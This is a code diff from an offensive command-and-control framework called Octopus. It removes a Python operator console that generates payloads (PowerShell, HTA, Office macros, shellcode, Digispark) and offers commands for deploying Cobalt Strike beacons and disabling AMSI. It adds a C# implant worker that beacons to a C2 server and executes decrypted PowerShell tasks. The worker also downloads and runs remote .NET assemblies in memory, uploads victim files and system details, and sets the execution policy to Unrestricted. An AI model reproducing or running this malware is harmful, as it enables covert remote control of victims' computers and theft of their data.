@@ -1,467 +1,429 @@
-﻿#!/usr/bin/python3
-
-import threading
-import readline
-import time
-import base64
-import sys
-import os
-import signal
-from termcolor import colored
-from core.functions import *
-from core.weblistener import *
-from flask import *
-from profile import *
-import logging
-
-python_version = sys.version_info[0]
-
-if python_version != 3:
-    print(colored("[-] Unable to run Octopus", "red"))
-    print(colored("[-] Please run Octopus with python 3", "red"))
-    sys.exit()
-
-listeners = NewListener()
-
-
-def ctrlc(sig, frame):
-    pass
-
-
-signal.signal(signal.SIGINT, ctrlc)
-if not os.path.isfile(".oct_history"):
-    open('.oct_history', 'a').close()
-else:
-    readline.read_history_file(".oct_history")
-
-banner()
-
-while True:
-
-    readline.set_completer(completer)
-    readline.parse_and_bind("tab: complete")
-    readline.write_history_file(".oct_history")
-    try:
-        command = input("\033[4mOctopus\033[0m" + colored(" >>", "green"))
-        # readline.write_history_file(".console_history.oct")
-        if command == "list":
-            list_sessions()
-
-        if command == "history":
-            get_history()
-
-        if command == "help":
-            main_help_banner()
-
-        if command == "listeners":
-            list_listeners()
-
-        if command.split(" ")[0] == "delete":
-            try:
-                session = connections_information[int(command.split(" ")[1])]
-                delete(session[2], int(command.split(" ")[1]))
-            except:
-                print(colored("[-] Wrong listener selected !", "red"))
-                continue
-
-        if command == "clear":
-            os.system("clear")
-
-        if command == "exit":
-            exit()
-
-        if command.split(" ")[0] == "generate_powershell":
-            try:
-                listener = command.split(" ")[1]
-            except IndexError:
-                print(colored("[-] Please select a listener !", "red"))
-                print(colored("Syntax :  generate_powershell listener_name", "green"))
-                print(colored("Example : generate_powershell listener1", "yellow"))
-                continue
-
-            try:
-                hostname = listeners_information[listener][3] + ":" + str(listeners_information[listener][2])
-                interval = listeners_information[listener][4]
-                path = listeners_information[listener][5]
-                proto = listeners_information[listener][6]
-
-                # check if protocol is True then https is used
-                if proto:
-                    proto_to_use = "https"
-                else:
-                    proto_to_use = "http"
-
-                generate(hostname, path, proto_to_use, interval)
-            except KeyError:
-                print(colored("[-] Wrong listener selected !", "red"))
-                continue
-
-        if command.split(" ")[0] == "delete_listener":
-            try:
-                try:
-                    listener = command.split(" ")[1]
-                    delete_listener(listener)
-                except IndexError:
-                    print(colored("[-] Please select a listener !", "red"))
-                    print(colored("Syntax :  delete_listener listener_name", "green"))
-                    print(colored("Example : delete_listener listener1", "yellow"))
-
-            except:
-                print(colored("[-] Wrong listener selected !", "red"))
-                continue
-
-        if command.split(" ")[0] == "generate_hta":
-            try:
-                listener = command.split(" ")[1]
-            except IndexError:
-                print(colored("[-] Please select a listener !", "red"))
-                print(colored("Syntax :  generate_hta listener_name", "green"))
-                print(colored("Example : generate_hta listener1", "yellow"))
-                continue
-
-            try:
-                host_ip = listeners_information[listener][3]
-                bind_port = listeners_information[listener][2]
-                path = listeners_information[listener][5]
-                proto = listeners_information[listener][6]
-
-                # check if protocol is True then https is used
-                if proto:
-                    proto_to_use = "https"
-                else:
-                    proto_to_use = "http"
-                listeners.create_hta()
-                generate_hta(host_ip, bind_port, proto_to_use)
-            except KeyError:
-                print(colored("[-] Wrong listener selected !", "red"))
-                continue
-
-        if command.split(" ")[0] == "generate_unmanaged_exe" or command.split(" ")[0] == "generate_dotnet":
-            cmd = command.split(" ")[0]
-
-            try:
-                listener = command.split(" ")[1]
-                exe_path = command.split(" ")[2]
-            except IndexError:
-                print(colored("[-] Please select a listener and check your options !", "red"))
-                print(colored("Syntax :  {} listener_name output_path", "green".format(cmd)))
-                print(colored("Example : {} listener1 /opt/Octopus/file.exe", "yellow".format(cmd)))
-                continue
-            try:
-                hostname = listeners_information[listener][3]+":"+str(listeners_information[listener][2])
-                path = listeners_information[listener][5]
-                proto = listeners_information[listener][6]
-
-                # check if protocol is True then https is used
-                if proto:
-                    proto_to_use = "https"
-                else:
-                    proto_to_use = "http"
-
-                if cmd == 'generate_unmanaged_exe':
-                    generate_exe_powershell_downloader(hostname, path, proto_to_use, exe_path)
-                elif cmd == 'generate_dotnet':
-                    task_check_interval = listeners_information[listener][4]
-                    generate_exe(hostname, proto_to_use, task_check_interval, exe_path)
-            except KeyError:
-                print(colored("[-] Wrong listener selected !", "red"))
-                continue
-
-        # generate_spoofed_args_exe
-
-        if command.split(" ")[0] == "generate_spoofed_args_exe":
-            try:
-                listener = command.split(" ")[1]
-                exe_path = command.split(" ")[2]
-            except IndexError:
-                print(colored("[-] Please select a listener and check your options !", "red"))
-                print(colored("Syntax :  generate_spoofed_args_exe listener_name output_path", "green"))
-                print(colored("Example : generate_spoofed_args_exe listener1 /opt/Octopus/file.exe", "yellow"))
-                continue
-
-            try:
-                hostname = listeners_information[listener][3] + ":" + str(listeners_information[listener][2])
-                path = listeners_information[listener][5]
-                proto = listeners_information[listener][6]
-
-                # check if protocol is True then https is used
-                if proto:
-                    proto_to_use = "https"
-                else:
-                    proto_to_use = "http"
-
-                generate_spoofed_args_exe(hostname, path, proto_to_use, exe_path)
-            except KeyError:
-                print(colored("[-] Wrong listener selected !", "red"))
-                continue
-
-        if command.split(" ")[0] == "generate_macro":
-            try:
-                listener = command.split(" ")[1]
-                exe_path = command.split(" ")[2]
-            except IndexError:
-                print(colored("[-] Please select a listener and check your options !", "red"))
-                print(colored("Syntax :  generate_macro listener_name output_path", "green"))
-                print(colored("Example : generate_macro listener1 /opt/Octopus/file.macro", "yellow"))
-                continue
-
-            try:
-                hostname = listeners_information[listener][3] + ":" + str(listeners_information[listener][2])
-                path = listeners_information[listener][5]
-                proto = listeners_information[listener][6]
-
-                # check if protocol is True then https is used
-                if proto:
-                    proto_to_use = "https"
-                else:
-                    proto_to_use = "http"
-
-                generate_macro(hostname, path, proto_to_use, exe_path)
-            except KeyError:
-                print(colored("[-] Wrong listener selected !", "red"))
-                continue
-
-        # shellcode
-
-        if command.split(" ")[0] == "generate_x86_shellcode":
-            try:
-                listener = command.split(" ")[1]
-            except IndexError:
-                print(colored("[-] Please select a listener and check your options !", "red"))
-                print(colored("Syntax :  generate_x86_shellcode listener_name", "green"))
-                print(colored("Example : generate_x86_shellcode listener1", "yellow"))
-                continue
-
-            try:
-                hostname = listeners_information[listener][3] + ":" + str(listeners_information[listener][2])
-                path = listeners_information[listener][5]
-                proto = listeners_information[listener][6]
-
-                # check if protocol is True then https is used
-                if proto:
-                    proto_to_use = "https"
-                else:
-                    proto_to_use = "http"
-
-                generate_x86_shellcode(hostname, path, proto_to_use)
-            except KeyError:
-                print(colored("[-] Wrong listener selected !", "red"))
-                continue
-
-        # shellcode x64
-
-        if command.split(" ")[0] == "generate_x64_shellcode":
-            try:
-                listener = command.split(" ")[1]
-            except IndexError:
-                print(colored("[-] Please select a listener and check your options !", "red"))
-                print(colored("Syntax :  generate_x64_shellcode listener_name", "green"))
-                print(colored("Example : generate_x64_shellcode listener1", "yellow"))
-                continue
-
-            try:
-                hostname = listeners_information[listener][3] + ":" + str(listeners_information[listener][2])
-                path = listeners_information[listener][5]
-                proto = listeners_information[listener][6]
-
-                # check if protocol is True then https is used
-                if proto:
-                    proto_to_use = "https"
-                else:
-                    proto_to_use = "http"
-
-                generate_x64_shellcode(hostname, path, proto_to_use)
-            except KeyError:
-                print(colored("[-] Wrong listener selected !", "red"))
-                continue
-
-        # generate_digispark
-        if command.split(" ")[0] == "generate_digispark":
-            try:
-                listener = command.split(" ")[1]
-                ino_path = command.split(" ")[2]
-            except IndexError:
-                print(colored("[-] Please select a listener and check your options !", "red"))
-                print(colored("Syntax :  generate_digispark listener_name output_path", "green"))
-                print(colored("Example : generate_digispark listener1 /opt/Octopus/file.ino", "yellow"))
-                continue
-
-            try:
-                hostname = listeners_information[listener][3] + ":" + str(listeners_information[listener][2])
-                path = listeners_information[listener][5]
-                proto = listeners_information[listener][6]
-
-                # check if protocol is True then https is used
-                if proto:
-                    proto_to_use = "https"
-                else:
-                    proto_to_use = "http"
-
-                generate_digispark(hostname, path, proto_to_use, ino_path)
-            except KeyError:
-                print(colored("[-] Wrong listener selected !", "red"))
-                continue
-
-        if command.split(" ")[0] == "interact":
-            readline.set_completer(completer_interact)
-            readline.parse_and_bind("tab: complete")
-
-            try:
-                session = connections_information[int(command.split(" ")[1])]
-            except:
-                print(colored("[-] Error interacting with host", "red"))
-                continue
-            while True:
-                try:
-                    scommand = input("(%s) >> " % colored(session[2], "red"))
-                    if scommand == "":
-                        continue
-                    elif scommand == "exit" or scommand == "back":
-                        break
-                    elif scommand == "help":
-                        interact_help()
-                    elif scommand == "clear":
-                        os.system("clear")
-
-                    elif scommand == "modules":
-                        list_modules()
-                        pass
-                    elif scommand.split(" ")[0] == "load":
-                        try:
-                            module_name = scommand.split(" ")[1]
-                            load_module(session[2], module_name)
-                            pass
-                        except IndexError:
-                            print(colored("[+] Please select a module !"))
-
-                    elif scommand.split(" ")[0] == "load_assembly":
-                        try:
-                            load_assembly(session[2], scommand)
-                            pass
-                        except IndexError:
-                            print(colored("[+] Invalid download URL !"))
-
-                    elif scommand.split(" ")[0] == "deploy_cobalt_beacon":
-                        try:
-                            beacon_path = scommand.split(" ")[1]
-                            deploy_cobalt_beacon(session[2], beacon_path)
-                            pass
-                        except IndexError:
-                            print(colored("[+] Please select a valid beacon path!", "red"))
-
-                    elif scommand == "disable_amsi":
-                        disable_amsi(session[2])
-                        pass
-                    else:
-                        send_command(session[2], scommand)
-                except:
-                    print(" ")
-
-        elif command.split(" ")[0] == "listen_http":
-            try:
-                # create new listeners for
-                ip = command.split(" ")[1]
-                try:
-                    port = int(command.split(" ")[2])
-                except ValueError:
-                    print(colored("[-] port should be number !", "red"))
-                    continue
-                host = command.split(" ")[3]
-                try:
-                    interval = int(command.split(" ")[4])
-                except ValueError:
-                    print(colored("[-] interval should be number !", "red"))
-                    continue
-                path = command.split(" ")[5]
-                listener_name = command.split(" ")[6]
-                if check_listener_name(listener_name):
-                    if check_url(path):
-                        listener = NewListener(
-                            listener_name,
-                            ip,
-                            port,
-                            host,
-                            interval,
-                            path
-                        )
-                        if check_listener_port(ip, port):
-                            listener.start_listener()
-                            listener.create_path()
-                            listeners = listener
-                            print(colored("[+]%s Listener has been created" % listener_name, "green"))
-                        # else:
-                        #    print(colored("[-] Cannot use the same hostname for multiple urls", "red"))
-                        # in order to make it global so we can use in other functions
-
-                        else:
-                            print(colored("[+] Port in use or you don't have permession to bind", "red"))
-                    else:
-                        print(colored("[-] URL name already used, please change it", "red"))
-                else:
-                    print(colored("[-] Listener name already used, please change it", "red"))
-
-            except IndexError:
-                print(colored("[-] Please check listener arguments !", "red"))
-                print(colored("Syntax  : listen_http BindIP BindPort hostname interval URL listener_name", "green"))
-                print(colored("Example (with domain) : listen_http 0.0.0.0 8080 myc2.live 5 comments.php op1_listener",
-                              "yellow"))
-                print(
-                    colored("Example (without domain) : listen_http 0.0.0.0 8080 172.0.1.3 5 profile.php op1_listener",
-                            "yellow"))
-                http_help_banner()
-
-                continue
-
-        elif command.split(" ")[0] == "listen_https":
-            try:
-                # create new listeners for
-                ip = command.split(" ")[1]
-                try:
-                    port = int(command.split(" ")[2])
-                except ValueError:
-                    print(colored("[-] port should be number !", "red"))
-                    continue
-                host = command.split(" ")[3]
-                try:
-                    interval = int(command.split(" ")[4])
-                except ValueError:
-                    print(colored("[-] interval should be number !", "red"))
-                    continue
-                path = command.split(" ")[5]
-                listener_name = command.split(" ")[6]
-                if check_listener_name(listener_name):
-                    key_path = command.split(" ")[7]
-                    cert_path = command.split(" ")[8]
-                    if not os.path.isfile(cert_path) or not os.path.isfile(key_path):
-                        print(colored("[-] Please check the certficate and key path", "red"))
-                    else:
-                        listener = NewListener(
-                            listener_name,
-                            ip,
-                            port,
-                            host,
-                            interval,
-                            path,
-                            cert_path,
-                            key_path
-                        )
-                        if check_listener_port(ip, port):
-                            listener.start_listener()
-                            listener.create_path()
-                            listeners = listener
-                            print(colored("[+]%s Listener has been created" % listener_name, "green"))
-                        else:
-                            print(colored("[+] Port in use or you don't have permession to bind", "red"))
-                else:
-                    print(colored("[-] Listener name already used, please change it", "red"))
-            except IndexError:
-                print(colored("[-] Please check listener arguments !", "red"))
-                print(colored(
-                    "Syntax  : listen_https BindIP BindPort hostname interval URL listener_name certficate_path key_path",
-                    "green"))
-                print(colored(
-                    "Example (with domain) : listen_https 0.0.0.0 443 myc2.live 5 login.php op1_listener certs/cert.pem certs/key.pem",
-                    "yellow"))
-                continue
-    except EOFError:
-        print(" ")
+﻿using System;
+using System.Collections.Generic;
+using System.Globalization;
+using System.IO;
+using System.Linq;
+using System.Management.Automation;
+using System.Net;
+using System.Reflection;
+using OctopusNET.Helpers;
+
+
+namespace OctopusNET.Services
+{
+    internal class PowerAgentWorker : IWorker
+    {
+        #region Members
+
+        private System.Timers.Timer _timer;
+        private bool _running;
+        private static PowerShell _ps;
+        #endregion
+
+        #region Worker Management Functions
+
+        public PowerAgentWorker()
+        {
+            _ps = PowerShell.Create();
+        }
+
+        public void Dispose()
+        {
+            //
+        }
+
+        public void Start()
+        {
+            Notify();
+            _running = true;
+            StartTimer();
+        }
+
+        public void Cancel()
+        {
+            _running = false;
+            StopTimer();
+        }
+
+
+        public void Wait()
+        {
+
+        }
+
+        public event EventHandler Completed;
+
+        protected virtual void OnCompleted()
+        {
+            Completed?.Invoke(this, EventArgs.Empty);
+        }
+
+
+        #endregion
+
+        #region Timer Functions
+
+        private void StartTimer()
+        {
+            _timer = new System.Timers.Timer { Interval = TimeSpan.FromSeconds(Config.M4).TotalMilliseconds };
+            _timer.Elapsed += OnTimerElapsed;
+            _timer.Start();
+        }
+
+        private void OnTimerElapsed(object sender, System.Timers.ElapsedEventArgs e)
+        {
+            if (!_running)
+                return;
+            try
+            {
+                // One task at a time.
+                StopTimer();
+
+                var cmd = CheckForTasks();
+
+                // Execute
+                ProcessCmd(cmd);
+            }
+            finally
+            {
+                // Re-Start the timer.. allow new task fetching
+                StartTimer();
+            }
+        }
+
+
+        private void StopTimer()
+        {
+            if (_timer != null)
+            {
+                _timer.Stop();
+                _timer.Enabled = false;
+                _timer.Elapsed -= OnTimerElapsed;
+            }
+        }
+
+        #endregion
+
+
+        #region Core Worker functions
+
+        /// <summary>
+        /// Say Hello
+        /// </summary>
+        /// <returns></returns>
+        private static void Notify()
+        {
+            try
+            {
+                var postUrl = $"{Config.M0}://{Config.M1}/{Config.L1}";
+                var sysInfo = SystemInfoHelpers.Instance.SystemInfoCombined;
+                var headers = BuildAuthHeader(sysInfo);
+                CommonHelpers.GetUrl(postUrl, headers, Config.M3);
+            }
+            catch (Exception)
+            {
+                //
+            }
+        }
+
+
+        private static string CheckForTasks()
+        {
+            var tries = 0;
+
+            while (true)
+            {
+                try
+                {
+                    var postUrl = $"{Config.M0}://{Config.M1}/{Config.L2}";
+                    postUrl = postUrl.Replace("<hostname>", SystemInfoHelpers.Instance.SystemInfo.Hostname);
+                    var result = CommonHelpers.GetUrl(postUrl, null, Config.M3);
+
+                    if (string.IsNullOrEmpty(result) || result.ToLower() == "false")
+                        return null;
+
+                    var cmd = CryptoServices.AesServiceProvider.AES_decrypt(result, Config.L7, Config.L77);
+
+                    return cmd;
+
+                }
+                catch (Exception)
+                {
+                    if (tries < Config.L9)
+                        tries++;
+                    else
+                        Environment.Exit(0);
+                }
+            }
+        }
+
+        private static void ProcessCmd(string cmd)
+        {
+            if (string.IsNullOrEmpty(cmd) || string.IsNullOrWhiteSpace(cmd)) return;
+
+            cmd = cmd.Trim();
+            cmd = new string(cmd.Where(c => !char.IsControl(c)).ToArray());
+            cmd = new string(cmd.Where(c => (int)c >= 0x1F).ToArray());
+            if (cmd.ToLower() == "false") return;
+
+            try
+            {
+                if(cmd.ToLower() == "report")
+                {
+                    var report = BuildDeviceReport();
+
+                    var headers = BuildAuthHeader(report);
+                    headers = AddAppLogicHeader(SystemInfoHelpers.Instance.SystemInfo.Hostname, headers);
+
+                    // Send execution result
+                    var postUrl = $"{Config.M0}://{Config.M1}/{Config.L4}";
+                    CommonHelpers.GetUrl(postUrl, headers, Config.M3);
+                }
+                else if (cmd.ToLower().StartsWith("download ") && cmd.Length > 9)
+                {
+                    var path = cmd.Trim().Substring(9).Trim();
+                    var reqParams = BuildFileUploadParams(path) ?? new Dictionary<string, object>();
+                    var postUrl = $"{Config.M0}://{Config.M1}/{Config.L5}";
+                    CommonHelpers.WebPostForm(reqParams, null, postUrl, Config.M3);
+                }
+                else if (cmd.ToLower().StartsWith("load_assembly") && cmd.Length > 9)
+                {
+                    cmd = cmd.Replace("load_assembly", "");
+                    var result = LoadAssembly(cmd);
+                    if (result == null)
+                        result = string.Empty;
+
+                    // Prepare response with result to API
+                    var headers = BuildAuthHeader(result);
+                    headers = AddSessionHeader(cmd, headers);
+                    headers = AddAppLogicHeader(SystemInfoHelpers.Instance.SystemInfo.Hostname, headers);
+
+
+                    // Send execution result
+                    var postUrl = $"{Config.M0}://{Config.M1}/{Config.L3}";
+                    CommonHelpers.GetUrl(postUrl, headers, Config.M3);
+                }
+                else if (cmd.ToLower().StartsWith("bypass-execpolicy") && cmd.Length > 9)
+                {
+                    var result = ByPassExecutionPolicy();
+                    if (result == null)
+                        result = string.Empty;
+
+                    // Prepare response with result to API
+                    var headers = BuildAuthHeader(result);
+                    headers = AddSessionHeader(cmd, headers);
+                    headers = AddAppLogicHeader(SystemInfoHelpers.Instance.SystemInfo.Hostname, headers);
+
+
+                    // Send execution result
+                    var postUrl = $"{Config.M0}://{Config.M1}/{Config.L3}";
+                    CommonHelpers.GetUrl(postUrl, headers, Config.M3);
+                }
+                else if (cmd.ToLower() == "reset-ps")
+                {
+                    _ps = PowerShell.Create();
+
+                    // Prepare response with result to API
+                    var headers = BuildAuthHeader("OK");
+                    headers = AddSessionHeader(cmd, headers);
+                    headers = AddAppLogicHeader(SystemInfoHelpers.Instance.SystemInfo.Hostname, headers);
+
+                    // Send execution result
+                    var postUrl = $"{Config.M0}://{Config.M1}/{Config.L3}";
+                    CommonHelpers.GetUrl(postUrl, headers, Config.M3);
+                }
+                else
+                {
+                    var result = RunPs(cmd);
+                    if (result == null)
+                        result = string.Empty;
+
+                    // Prepare response with result to API
+                    var headers = BuildAuthHeader(result);
+                    headers = AddSessionHeader(cmd, headers);
+                    headers = AddAppLogicHeader(SystemInfoHelpers.Instance.SystemInfo.Hostname, headers);
+
+
+                    // Send execution result
+                    var postUrl = $"{Config.M0}://{Config.M1}/{Config.L3}";
+                    CommonHelpers.GetUrl(postUrl, headers, Config.M3);
+                }
+            }
+            catch (Exception e)
+            {
+                // Prepare response with result to API
+                var headers = BuildAuthHeader(e.Message);
+                headers = AddSessionHeader(cmd, headers);
+                headers = AddAppLogicHeader(SystemInfoHelpers.Instance.SystemInfo.Hostname, headers);
+
+                // Send execution result
+                var postUrl = $"{Config.M0}://{Config.M1}/{Config.L3}";
+                CommonHelpers.GetUrl(postUrl, headers, Config.M3);
+            }
+        }
+
+
+        private static string RunPs(string code)
+        {
+            _ps.AddScript(code);
+
+            var output = _ps.Invoke();
+
+            if (output != null && output.Count > 0)
+                return output[0].BaseObject.ToString();
+
+            return string.Empty;
+        }
+
+        private static string BuildDeviceReport()
+        {
+            try
+            {
+                var procList = CommonHelpers.GetProcNameList();
+                var proc = procList.Aggregate((i, j) => i + " " + j);
+
+                var ipList = CommonHelpers.GetLocalIps();
+                var ips = ipList.Aggregate((i, j) => i + ";" + j);
+                var arr = new[]
+                {
+                    $"{proc}",
+                    $"{ips}",
+                    $"{Environment.OSVersion.Version}",
+                    $"{CultureInfo.InstalledUICulture.Name}",
+                    $"{CommonHelpers.GetComputerUpTime()}",
+                    $"{DateTime.Now:HH:mm(MM/dd/yyyy)}"
+                };
+
+                var fi = arr.Aggregate((i, j) => i + " " + j);
+                return fi.Trim();
+
+            }
+            catch (Exception)
+            {
+                return string.Empty;
+            }
+        }
+
+
+        private static string LoadAssembly(string input)
+        {
+            var downloadUrl = string.Empty;
+            var param = string.Empty;
+
+            try
+            {
+                if (string.IsNullOrEmpty(input))
+                    throw new ArgumentNullException(nameof(input));
+
+                input = input.Trim();
+
+
+                if (input.Contains("--params="))
+                {
+                    downloadUrl = input.Substring(0, input.IndexOf("--params=", StringComparison.InvariantCulture)).Trim();
+
+                    var toMatch = "--params=";
+                    param = input.Substring(input.IndexOf(toMatch, StringComparison.InvariantCulture) + toMatch.Length).Trim();
+                }
+                else
+                {
+                    downloadUrl = input;
+                }
+
+
+                var wb = new WebClient();
+                var food = wb.DownloadData(downloadUrl);
+
+                var asm = Assembly.Load(food).EntryPoint;
+
+                if (asm == null)
+                    throw new ArgumentNullException(nameof(asm));
+
+
+                if (!string.IsNullOrEmpty(param))
+                {
+                    var parameters = new[] { param };
+                    asm.Invoke(null, new object[] { parameters });
+                }
+                else
+                {
+                    asm.Invoke(null, new object[] { new[] { "" } });
+                }
+
+                return "Delivered!";
+            }
+            catch (WebException)
+            {
+                return $"Failed to Download '{downloadUrl}'";
+            }
+            catch (Exception e)
+            {
+                return $"Failed to load the assembly '{downloadUrl}' {e.Message}";
+            }
+        }
+
+
+        private static string ByPassExecutionPolicy()
+        {
+            _ps.Commands.AddCommand("Get-ExecutionPolicy");
+            if (_ps.AddCommand("Get-ExecutionPolicy").Invoke().First().ToString() == "Restricted")
+            {
+                _ps.Commands.AddCommand("Set-ExecutionPolicy");
+                _ps.Commands.AddArgument("Unrestricted");
+                _ps.Invoke();
+            }
+
+            return _ps.AddCommand("Get-ExecutionPolicy").Invoke().First().ToString();
+        }
+
+        private static Dictionary<string, string> BuildAuthHeader(string text)
+        {
+            var ec = CryptoServices.AesServiceProvider.AES_encrypt(text, Config.L7, Config.L77);
+            return new Dictionary<string, string> {{"Authorization", ec}};
+        }
+
+        private static Dictionary<string, string> AddAppLogicHeader(string text, Dictionary<string, string> headers)
+        {
+            var ec = CryptoServices.AesServiceProvider.AES_encrypt(text, Config.L7, Config.L77);
+
+            if (headers.ContainsKey("App-Logic"))
+                headers["App-Logic"] = ec;
+            else
+                headers.Add("App-Logic", ec);
+
+            return headers;
+        }
+
+        private static Dictionary<string, string> AddSessionHeader(string text, Dictionary<string, string> headers)
+        {
+            var ec = CryptoServices.AesServiceProvider.AES_encrypt(text, Config.L7, Config.L77);
+
+            if (headers.ContainsKey("Session"))
+                headers["Session"] = ec;
+            else
+                headers.Add("Session", ec);
+
+            return headers;
+        }
+
+        private static Dictionary<string, object> BuildFileUploadParams(string fPath)
+        {
+            var fi = new FileInfo(fPath);
+            if (!fi.Exists)
+                return null;
+
+            var fInfo = new UploadFileInfo(fi);
+            var fileEncoded64 = Convert.ToBase64String(fInfo.FileBytes);
+            var dict = new Dictionary<string, object>
+            {
+                ["fn"] = CryptoServices.AesServiceProvider.AES_encrypt(fi.Name, Config.L7, Config.L77),
+                ["token"] = CryptoServices.AesServiceProvider.AES_encrypt(fileEncoded64, Config.L7, Config.L77)
+            };
+
+            return dict;
+        }
+
+        #endregion
+
+    }
+}
